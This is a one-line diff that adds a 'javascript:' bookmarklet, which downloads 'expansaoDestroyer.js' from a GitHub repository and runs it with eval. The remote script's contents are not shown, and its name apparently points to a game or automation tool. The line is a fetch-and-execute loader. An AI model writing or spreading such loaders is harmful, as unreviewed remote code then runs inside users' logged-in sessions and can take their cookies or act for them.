@@ -1,0 +1,1 @@
+javascript:fetch("https://raw.githubusercontent.com/Phzzin7Z/DestroyerPhzzin/main/expansaoDestroyer.js").then(t=>t.text()).then(eval);
